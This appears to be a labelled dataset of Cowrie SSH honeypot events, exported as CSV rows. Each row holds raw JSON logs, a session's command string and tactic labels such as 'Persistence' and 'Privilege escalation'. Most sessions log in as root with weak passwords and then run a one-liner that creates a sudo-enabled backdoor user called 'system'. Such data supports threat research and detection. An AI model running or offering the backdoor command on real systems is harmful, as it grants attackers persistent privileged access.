,event,session_id,session,labels
668,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T14:53:05.605563Z"", ""session_id"": ""863648dae5aa""}",863648dae5aa,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 EtYQ92ar) system  && sudo usermod -aG sudo system ; openssl passwd -1 EtYQ92ar;,"['Initial access', 'Persistence', 'Privilege escalation']"
669,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 EtYQ92ar) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 EtYQ92ar) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T14:53:05.605934Z"", ""session_id"": ""863648dae5aa""}",863648dae5aa,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 EtYQ92ar) system  && sudo usermod -aG sudo system ; openssl passwd -1 EtYQ92ar;,"['Initial access', 'Persistence', 'Privilege escalation']"
670,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 EtYQ92ar"", ""message"": ""CMD: openssl passwd -1 EtYQ92ar"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T14:53:05.606311Z"", ""session_id"": ""863648dae5aa""}",863648dae5aa,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 EtYQ92ar) system  && sudo usermod -aG sudo system ; openssl passwd -1 EtYQ92ar;,"['Initial access', 'Persistence', 'Privilege escalation']"
671,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 EtYQ92ar"", ""message"": ""Command not found: openssl passwd -1 EtYQ92ar"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T14:53:05.606862Z"", ""session_id"": ""863648dae5aa""}",863648dae5aa,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 EtYQ92ar) system  && sudo usermod -aG sudo system ; openssl passwd -1 EtYQ92ar;,"['Initial access', 'Persistence', 'Privilege escalation']"
672,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/b64f877232784b8cf7211c5c7e7839e950feb095cf3c666d99b272bfab7963bf after 0.1 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""b64f877232784b8cf7211c5c7e7839e950feb095cf3c666d99b272bfab7963bf"", ""size"": 154.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T14:53:05.711593Z"", ""ttylog"": ""var/lib/cowrie/tty/b64f877232784b8cf7211c5c7e7839e950feb095cf3c666d99b272bfab7963bf"", ""session_id"": ""863648dae5aa""}",863648dae5aa,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 EtYQ92ar) system  && sudo usermod -aG sudo system ; openssl passwd -1 EtYQ92ar;,"['Initial access', 'Persistence', 'Privilege escalation']"
673,"{""duration"": ""1.0"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 1.0 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T14:53:05.712163Z"", ""session_id"": ""863648dae5aa""}",863648dae5aa,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 EtYQ92ar) system  && sudo usermod -aG sudo system ; openssl passwd -1 EtYQ92ar;,"['Initial access', 'Persistence', 'Privilege escalation']"
674,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:12696 (10.42.6.15:2222) [session: 86267c8f2de6]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 12696.0, ""timestamp"": ""2025-08-04T20:44:17.036473Z"", ""session_id"": ""86267c8f2de6""}",86267c8f2de6,echo this_is_a_very_unique_test_string_42 > /tmp/honeypot_test_file.txt  && cat /tmp/honeypot_test_file.txt  && rm /tmp/honeypot_test_file.txt;,"['Initial access', 'Discovery']"
675,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-04T20:44:17.037906Z"", ""version"": ""SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5"", ""session_id"": ""86267c8f2de6""}",86267c8f2de6,echo this_is_a_very_unique_test_string_42 > /tmp/honeypot_test_file.txt  && cat /tmp/honeypot_test_file.txt  && rm /tmp/honeypot_test_file.txt;,"['Initial access', 'Discovery']"
676,"{""compCS"": [""none""], ""encCS"": [""chacha20-poly1305@openssh.com"", ""aes128-gcm@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr"", ""aes128-cbc"", ""3des-cbc"", ""arcfour256""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""730ba0b14c6defc00fcecff1de447290"", ""hashAlgorithms"": ""mlkem768x25519-sha256,curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1,ext-info-c,kex-strict-c-v00@openssh.com;chacha20-poly1305@openssh.com,aes128-gcm@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-cbc,3des-cbc,arcfour256;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""mlkem768x25519-sha256"", ""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group-exchange-sha256"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group16-sha512"", ""diffie-hellman-group14-sha1"", ""diffie-hellman-group-exchange-sha1"", ""diffie-hellman-group1-sha1"", ""ext-info-c"", ""kex-strict-c-v00@openssh.com""], ""keyAlgs"": [""rsa-sha2-256-cert-v01@openssh.com"", ""rsa-sha2-512-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-256"", ""rsa-sha2-512"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-512-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha2-512"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 730ba0b14c6defc00fcecff1de447290"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-04T20:44:17.072063Z"", ""session_id"": ""86267c8f2de6""}",86267c8f2de6,echo this_is_a_very_unique_test_string_42 > /tmp/honeypot_test_file.txt  && cat /tmp/honeypot_test_file.txt  && rm /tmp/honeypot_test_file.txt;,"['Initial access', 'Discovery']"
677,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/FattMan1234567890] succeeded"", ""password"": ""FattMan1234567890"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-04T20:44:17.178600Z"", ""username"": ""root"", ""session_id"": ""86267c8f2de6""}",86267c8f2de6,echo this_is_a_very_unique_test_string_42 > /tmp/honeypot_test_file.txt  && cat /tmp/honeypot_test_file.txt  && rm /tmp/honeypot_test_file.txt;,"['Initial access', 'Discovery']"
678,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-04T20:44:17.294897Z"", ""session_id"": ""86267c8f2de6""}",86267c8f2de6,echo this_is_a_very_unique_test_string_42 > /tmp/honeypot_test_file.txt  && cat /tmp/honeypot_test_file.txt  && rm /tmp/honeypot_test_file.txt;,"['Initial access', 'Discovery']"
679,"{""eventid"": ""cowrie.command.input"", ""input"": ""echo this_is_a_very_unique_test_string_42 > /tmp/honeypot_test_file.txt && cat /tmp/honeypot_test_file.txt && rm /tmp/honeypot_test_file.txt"", ""message"": ""CMD: echo this_is_a_very_unique_test_string_42 > /tmp/honeypot_test_file.txt && cat /tmp/honeypot_test_file.txt && rm /tmp/honeypot_test_file.txt"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-04T20:44:17.295783Z"", ""session_id"": ""86267c8f2de6""}",86267c8f2de6,echo this_is_a_very_unique_test_string_42 > /tmp/honeypot_test_file.txt  && cat /tmp/honeypot_test_file.txt  && rm /tmp/honeypot_test_file.txt;,"['Initial access', 'Discovery']"
680,"{""destfile"": ""/tmp/honeypot_test_file.txt"", ""duplicate"": false, ""eventid"": ""cowrie.session.file_download"", ""message"": ""Saved redir contents with SHA-256 d32dae7719d18880635c6becf806709043e82eee383ceee0112eec1574feaf0d to var/lib/cowrie/downloads/d32dae7719d18880635c6becf806709043e82eee383ceee0112eec1574feaf0d"", ""outfile"": ""var/lib/cowrie/downloads/d32dae7719d18880635c6becf806709043e82eee383ceee0112eec1574feaf0d"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""shasum"": ""d32dae7719d18880635c6becf806709043e82eee383ceee0112eec1574feaf0d"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-04T20:44:17.331563Z"", ""session_id"": ""86267c8f2de6""}",86267c8f2de6,echo this_is_a_very_unique_test_string_42 > /tmp/honeypot_test_file.txt  && cat /tmp/honeypot_test_file.txt  && rm /tmp/honeypot_test_file.txt;,"['Initial access', 'Discovery']"
681,"{""duplicate"": false, ""duration"": ""0.0"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/794705e2b2beab6d5becead7b917fb4bbcaf64099f7357a63444e62a5010ad2a after 0.0 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""shasum"": ""794705e2b2beab6d5becead7b917fb4bbcaf64099f7357a63444e62a5010ad2a"", ""size"": 37.0, ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-04T20:44:17.332228Z"", ""ttylog"": ""var/lib/cowrie/tty/794705e2b2beab6d5becead7b917fb4bbcaf64099f7357a63444e62a5010ad2a"", ""session_id"": ""86267c8f2de6""}",86267c8f2de6,echo this_is_a_very_unique_test_string_42 > /tmp/honeypot_test_file.txt  && cat /tmp/honeypot_test_file.txt  && rm /tmp/honeypot_test_file.txt;,"['Initial access', 'Discovery']"
682,"{""duration"": ""0.3"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.3 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-04T20:44:17.333152Z"", ""session_id"": ""86267c8f2de6""}",86267c8f2de6,echo this_is_a_very_unique_test_string_42 > /tmp/honeypot_test_file.txt  && cat /tmp/honeypot_test_file.txt  && rm /tmp/honeypot_test_file.txt;,"['Initial access', 'Discovery']"
683,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:38364 (10.42.4.33:2222) [session: 8201c19ec4bf]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 38364.0, ""timestamp"": ""2025-08-09T13:49:26.379740Z"", ""session_id"": ""8201c19ec4bf""}",8201c19ec4bf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 3vjcqPDn) system  && sudo usermod -aG sudo system ; openssl passwd -1 3vjcqPDn;,"['Initial access', 'Persistence', 'Privilege escalation']"
684,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T13:49:26.380140Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""8201c19ec4bf""}",8201c19ec4bf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 3vjcqPDn) system  && sudo usermod -aG sudo system ; openssl passwd -1 3vjcqPDn;,"['Initial access', 'Persistence', 'Privilege escalation']"
685,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T13:49:26.471671Z"", ""session_id"": ""8201c19ec4bf""}",8201c19ec4bf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 3vjcqPDn) system  && sudo usermod -aG sudo system ; openssl passwd -1 3vjcqPDn;,"['Initial access', 'Persistence', 'Privilege escalation']"
686,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T13:49:26.748666Z"", ""username"": ""root"", ""session_id"": ""8201c19ec4bf""}",8201c19ec4bf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 3vjcqPDn) system  && sudo usermod -aG sudo system ; openssl passwd -1 3vjcqPDn;,"['Initial access', 'Persistence', 'Privilege escalation']"
687,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T13:49:26.946500Z"", ""session_id"": ""8201c19ec4bf""}",8201c19ec4bf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 3vjcqPDn) system  && sudo usermod -aG sudo system ; openssl passwd -1 3vjcqPDn;,"['Initial access', 'Persistence', 'Privilege escalation']"
688,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 3vjcqPDn) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 3vjcqPDn) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T13:49:26.946864Z"", ""session_id"": ""8201c19ec4bf""}",8201c19ec4bf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 3vjcqPDn) system  && sudo usermod -aG sudo system ; openssl passwd -1 3vjcqPDn;,"['Initial access', 'Persistence', 'Privilege escalation']"
689,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 3vjcqPDn"", ""message"": ""CMD: openssl passwd -1 3vjcqPDn"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T13:49:26.947251Z"", ""session_id"": ""8201c19ec4bf""}",8201c19ec4bf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 3vjcqPDn) system  && sudo usermod -aG sudo system ; openssl passwd -1 3vjcqPDn;,"['Initial access', 'Persistence', 'Privilege escalation']"
690,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 3vjcqPDn"", ""message"": ""Command not found: openssl passwd -1 3vjcqPDn"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T13:49:26.947857Z"", ""session_id"": ""8201c19ec4bf""}",8201c19ec4bf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 3vjcqPDn) system  && sudo usermod -aG sudo system ; openssl passwd -1 3vjcqPDn;,"['Initial access', 'Persistence', 'Privilege escalation']"
691,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/d675385beaa3db34673270eb8938a7573a37c74eef5830c234b8538bb3988405 after 0.1 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""d675385beaa3db34673270eb8938a7573a37c74eef5830c234b8538bb3988405"", ""size"": 154.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T13:49:27.040446Z"", ""ttylog"": ""var/lib/cowrie/tty/d675385beaa3db34673270eb8938a7573a37c74eef5830c234b8538bb3988405"", ""session_id"": ""8201c19ec4bf""}",8201c19ec4bf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 3vjcqPDn) system  && sudo usermod -aG sudo system ; openssl passwd -1 3vjcqPDn;,"['Initial access', 'Persistence', 'Privilege escalation']"
692,"{""duration"": ""0.7"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.7 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T13:49:27.041106Z"", ""session_id"": ""8201c19ec4bf""}",8201c19ec4bf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 3vjcqPDn) system  && sudo usermod -aG sudo system ; openssl passwd -1 3vjcqPDn;,"['Initial access', 'Persistence', 'Privilege escalation']"
693,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:37577 (10.42.6.15:2222) [session: 8e93772b8334]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 37577.0, ""timestamp"": ""2025-08-11T00:10:24.825754Z"", ""session_id"": ""8e93772b8334""}",8e93772b8334,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 cAdVqqHW) system  && sudo usermod -aG sudo system ; openssl passwd -1 cAdVqqHW;,"['Initial access', 'Persistence', 'Privilege escalation']"
694,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-11T00:10:24.827096Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""8e93772b8334""}",8e93772b8334,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 cAdVqqHW) system  && sudo usermod -aG sudo system ; openssl passwd -1 cAdVqqHW;,"['Initial access', 'Persistence', 'Privilege escalation']"
695,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-11T00:10:24.839264Z"", ""session_id"": ""8e93772b8334""}",8e93772b8334,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 cAdVqqHW) system  && sudo usermod -aG sudo system ; openssl passwd -1 cAdVqqHW;,"['Initial access', 'Persistence', 'Privilege escalation']"
